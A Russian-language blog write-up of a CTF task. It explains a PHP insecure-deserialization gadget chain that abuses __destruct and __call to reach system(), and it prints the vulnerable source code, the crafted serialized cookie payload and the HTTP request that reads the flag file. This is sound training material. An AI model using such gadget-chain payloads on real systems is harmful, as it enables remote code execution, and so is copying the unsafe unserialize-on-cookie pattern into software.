---
layout: post
comments: true
title: "Write-up on some task from Singletone Security Intern CTF [in Russian]"
excerpt: "RCE via insecure deserialization using a chain of PHP gadgets"
date: 2024-04-30 23:00:00
tags: php, ctf, writeup, insecure, deserialization
---

![](/assets/images/dalle_lock.webp)

Дан IP-адрес сервиса, по которому отображается некая форма ввода:

[![](/assets/images/task2_form.png)](/assets/images/task2_form.png)

Также можно скачать исходник PHP-файл как `https://ip/source.php~`:

```php
<?php
include('flag.php');
error_reporting(E_ALL & ~E_WARNING & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT);

if (isset($_GET['source'])) {
    die(highlight_file(__FILE__));
}

class User {
    public $name;
    public $age;
    public $city;

    public function __construct($name, $age, $city) {
        $handler = new UserNameHandler();
        $this->name = $handler->handleData($name);
        $this->age = $age;
        $this->city = $city;
    }
}
class UserNameHandler {
    public function handleData($name) {
        return ucfirst(strtolower(trim($name)));
    }
}
class EventHandler {
    private $event;
    private $events;
    private $logFilePath;

    public function __construct($event, $events) {
        $this->event = $event;
        $this->events = $events;
        $this->logFilePath = '/tmp/logfile.log';
    }

    public function logEvent($event) {
        file_put_contents($this->logFilePath, $event, FILE_APPEND);
    }

    public function __destruct()
    {
        $this->events->handleEvent($this->event);
    }
}

class UserLogger {
    private $updaters;
    private $logFilePath;

    public function __construct($updaters) {
        $this->updaters = $updaters;
        $this->logFilePath = '/tmp/logfile.log';
    }

    public function __call($method, $attributes)
    {
        return $this->modify($method, $attributes);
    }

    public function modify($updater, $arguments = array())
    {
        return call_user_func_array($this->getModification($updater), $arguments);
    }

    public function getModification($updater)
    {
        if (isset($this->updaters[$updater])) {
            return $this->updaters[$updater];
        }
    }

    public function logData($user) {
        $logMessage = sprintf("User: %s, Age: %d, City: %s\n", $user->name, $user->age, $user->city);
        file_put_contents($this->logFilePath, $logMessage, FILE_APPEND);
    }
}

if (isset($_POST['name']) && isset($_POST['age']) && isset($_POST['city'])) {
    $user = new User($_POST['name'], $_POST['age'], $_POST['city']);
    $userLogger = new UserLogger([]);
    $userLogger->logData($user);
    $serialized = serialize($user);
    setcookie('userData', $serialized, time() + (86400 * 30), "/");
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit();
}

$userData = null;
if (isset($_COOKIE['userData'])) {
    $userData = unserialize($_COOKIE['userData']);
}
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Сбор данных</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="container">
    <div>
        <h1>Заполните форму</h1>
    </div>
    <form action="" method="post">
        <div class="form-group">
            <label for="name">Имя:</label>
            <input type="text" id="name" name="name" required>
        </div>
        <div class="form-group">
            <label for="age">Возраст:</label>
            <input type="number" id="age" name="age" required>
        </div>
        <div class="form-group">
            <label for="city">Город:</label>
            <input type="text" id="city" name="city" required>
        </div>
        <button type="submit">Отправить</button>
    </form>
    <?php if ($userData): ?>
        <div class="user-info">
            <p>Имя: <span><?php echo htmlspecialchars($userData->name); ?></span></p>
            <p>Возраст: <span><?php echo htmlspecialchars($userData->age); ?></span></p>
            <p>Город: <span><?php echo htmlspecialchars($userData->city); ?></span></p>
        </div>
    <?php endif; ?>
</div>
</body>
</html>
```

Изучим его. Видим, что, есть какие-то классы `User`, `UserNameHandler`, `EventHandler`
`UserLogger`, и скорей всего, флаг содержится в файле `flag.php`. При подробном изучении замечаем магические PHP-методы `__construct`, `__desctruct` и `__call`. Это означает, что в этой задаче нужно проэксплуатировать RCE через небезопасную десериалиацию, используя создание цепочки произвольных PHP гаджетов.

Если вы не знакомы с темой, то рекомендую почитать [Magic methods](https://portswigger.net/web-security/deserialization/exploiting#magic-methods) и прорешать соответсвущую лабы в Portswigger Web Security Academy:
- [Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)
- [Developing a custom gadget chain for PHP deserialization](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization)

Здесь случай похожий, но посложнее.

Очевидно, что зловредный сериализованный объект считывается через куку `userData=` и затем десериализуется в этом куске кода при обращении к странице через GET-запрос:

```php
$userData = null;
if (isset($_COOKIE['userData'])) {
    $userData = unserialize($_COOKIE['userData']);
}
```

Сама же кука выдается после отправки заполненной формы:

```html
POST / HTTP/2
Host: task2.ctf.singleton-security.ru
Cookie: userData=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: https://task2.ctf.singleton-security.ru
Referer: https://task2.ctf.singleton-security.ru/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

name=foo&age=bar&city=abc
```

Ответ:

```
HTTP/2 302 Found
Date: Fri, 05 Apr 2024 05:23:09 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 0
X-Powered-By: PHP/7.4.33
Set-Cookie: userData=O%3a4%3a%22User%22%3a3%3a%7Bs%3a4%3a%22name%22%3bs%3a3%3a%22Foo%22%3bs%3a3%3a%22age%22%3bs%3a3%3a%22bar%22%3bs%3a4%3a%22city%22%3bs%3a3%3a%22abc%22%3b%7D; expires=Sun, 05-May-2024 05:23:09 GMT; Max-Age=2592000; path=/
Location: /
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

URL-декодируем куку и посмотрим как она выглядит:

```php
userData=O:4:"User":3:{s:4:"name";s:3:"Foo";s:3:"age";s:3:"bar";s:4:"city";s:3:"abc";};
```

Эта кука затем присоединяется в GET-запрос при редиректе, после чего приходит такой ответ:

```html
HTTP/2 200 OK
Date: Fri, 05 Apr 2024 05:23:10 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 1138
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Strict-Transport-Security: max-age=31536000; includeSubDomains

<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Сбор данных</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="container">
    <div>
        <h1>Заполните форму</h1>
    </div>
    <form action="" method="post">
        <div class="form-group">
            <label for="name">Имя:</label>
            <input type="text" id="name" name="name" required>
        </div>
        <div class="form-group">
            <label for="age">Возраст:</label>
            <input type="number" id="age" name="age" required>
        </div>
        <div class="form-group">
            <label for="city">Город:</label>
            <input type="text" id="city" name="city" required>
        </div>
        <button type="submit">Отправить</button>
    </form>
            <div class="user-info">
            <p>Имя: <span>Foo</span></p>
            <p>Возраст: <span>bar</span></p>
            <p>Город: <span>abc</span></p>
        </div>
    </div>
</body>
</html>
```

Теперь давайте подробнее посмотрим исходники, чтобы понять, какие гаджеты можно сконструировать. Видим, что в итоге на странице печатаются содержимое атрбиутов `name`, `age` и `city`.

Атрибут `name` не подходит для экплуатации, т.к. дальше он попадает в метод `handleData()` класса `UserNameHandler`, где нет магических методов. Ничего не сделаешь.

Атрибут `age` подходит для эксплуатации, т.к. при конструировании инстанса класса `User` с ним не происходит никаких действий, а эначит можно передать туда что угодно, например, инстанс класса `EventHandler`.

Класс `EventHandler` требует при конструировании 2 аргумента: какое-то событие или команду, и, наконец, какой-то объект, у которого есть метод `handleEvent()`.

Смотря в код, не видно никакого класса с методом `handleEvent()`. Однако, из документации PHP известно, что [магический метод `__call()` вызывается, когда происходит обращение к недоступным методам класса](https://www.php.net/manual/en/language.oop5.overloading.php#object.call).
Здесь как раз есть класс `UserLogger` с определенным методом `__call()`.
Далее становится очевидно, что при конструировании надо передать массив, но непонятно какой именно.

Вглянем на вызов метода `handleEvent()`. Как вместо него вызывать `system()`?
После долгих поисков стало понятно, что надо передавать ассоциативный массив. Вот пример, который запускается в любом онлайн PHP интерпретаторе:

```php
<?php
   $foo = array('handleEvent' => 'system');
   $aga = serialize($foo);
   echo $aga . "\n";
   $foo['handleEvent']('date');
?>
```

Результат:
```
a:1:{s:11:"handleEvent";s:6:"system";}
Thu Apr  4 20:23:58 IST 2024
```

Аналогичным образом будет работать такой массив и в нашем случае.
В итоге, нужно передать в куку такой сериализованный объект, который после десериалиации должен выглядеть примерно так:

```php
$user = new User('Ivan', new EventHandler("cat flag.php", new UserLogger(array('handleEvent' => 'system'))), 'ololo');
```

При выходе из области видимости у экземпляра класса `EventHandler` вызовется `__desctruct()`, где вместо `handleEvent()` вызовется `system()` с любой командой, которая была передана при конструировании.

Проверим локально. Скопируем код в отдельный файл, вручную состряпаем сериализованный пейлоад и запустим с командой `date`:

```php
<?php
error_reporting(E_ALL & ~E_WARNING & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT);

class User {
    public $name;
    public $age;
    public $city;

    public function __construct($name, $age, $city) {
        $handler = new UserNameHandler();
        $this->name = $handler->handleData($name);
        $this->age = $age;
        $this->city = $city;
    }
}
class UserNameHandler {
    public function handleData($name) {
        return ucfirst(strtolower(trim($name)));
    }
}
class EventHandler {
    private $event;
    private $events;
    private $logFilePath;

    public function __construct($event, $events) {
        $this->event = $event;
        $this->events = $events;
        $this->logFilePath = '/tmp/logfile.log';
    }

    public function logEvent($event) {
        file_put_contents($this->logFilePath, $event, FILE_APPEND);
    }

    public function __destruct()
    {
        $this->events->handleEvent($this->event);
    }
}

class UserLogger {
    private $updaters;
    private $logFilePath;

    public function __construct($updaters) {
        $this->updaters = $updaters;
        $this->logFilePath = '/tmp/logfile.log';
    }

    public function __call($method, $attributes)
    {
        return $this->modify($method, $attributes);
    }

    public function modify($updater, $arguments = array())
    {
        return call_user_func_array($this->getModification($updater), $arguments);
    }

    public function getModification($updater)
    {
        if (isset($this->updaters[$updater])) {
            return $this->updaters[$updater];
        }
    }

    public function logData($user) {
        $logMessage = sprintf("User: %s, Age: %d, City: %s\n", $user->name, $user->age, $user->city);
        file_put_contents($this->logFilePath, $logMessage, FILE_APPEND);
    }
}

$payload = "O:4:\"User\":3:{s:4:\"name\";s:4:\"Ivan\";s:3:\"age\";O:12:\"EventHandler\":3:{s:5:\"event\";s:4:\"date\";s:6:\"events\";O:10:\"UserLogger\":2:{s:8:\"updaters\";a:1:{s:11:\"handleEvent\";s:6:\"system\";}s:11:\"logFilePath\";s:16:\"/tmp/logfile.log\";}s:11:\"logFilePath\";s:16:\"/tmp/logfile.log\";}s:4:\"city\";s:5:\"ololo\";}";

$foo = unserialize($payload);
echo $foo->name . "\n";
echo $foo->city . "\n";
?>
```

Работает!

```sh
└─$ php try_to_debug_task2.php
Ivan
ololo
Fri Apr  5 09:03:50 AM MSK 2024
```

Пробуем отправить пейлоад в куке, поменяв команду `date` на `cat flag.php` и ее длину (`s:4`-> `s:12`), и закодировав в URL:

```
GET / HTTP/2
Host: task2.ctf.singleton-security.ru
Cookie: userData=O%3a4%3a"User"%3a3%3a{s%3a4%3a"name"%3bs%3a4%3a"Ivan"%3bs%3a3%3a"age"%3bO%3a12%3a"EventHandler"%3a3%3a{s%3a5%3a"event"%3bs%3a12%3a"cat flag.php"%3bs%3a6%3a"events"%3bO%3a10%3a"UserLogger"%3a2%3a{s%3a8%3a"updaters"%3ba%3a1%3a{s%3a11%3a"handleEvent"%3bs%3a6%3a"system"%3b}s%3a11%3a"logFilePath"%3bs%3a16%3a"/tmp/logfile.log"%3b}s%3a11%3a"logFilePath"%3bs%3a16%3a"/tmp/logfile.log"%3b}s%3a4%3a"city"%3bs%3a5%3a"ololo"%3b}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://task2.ctf.singleton-security.ru/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

Ответ:

```html
HTTP/2 200 OK
Date: Fri, 05 Apr 2024 06:01:35 GMT
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Strict-Transport-Security: max-age=31536000; includeSubDomains

<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Сбор данных</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="container">
    <div>
        <h1>Заполните форму</h1>
    </div>
    <form action="" method="post">
        <div class="form-group">
            <label for="name">Имя:</label>
            <input type="text" id="name" name="name" required>
        </div>
        <div class="form-group">
            <label for="age">Возраст:</label>
            <input type="number" id="age" name="age" required>
        </div>
        <div class="form-group">
            <label for="city">Город:</label>
            <input type="text" id="city" name="city" required>
        </div>
        <button type="submit">Отправить</button>
    </form>
            <div class="user-info">
            <p>Имя: <span>Ivan</span></p>
            <p>Возраст: <span></span></p>
            <p>Город: <span>ololo</span></p>
        </div>
    </div>
</body>
</html>
<?php
$FLAG = "CU\$t0m_cH41n_h3R0";
?>
```

В ответе видим содержимое `flag.php`. Задание решено.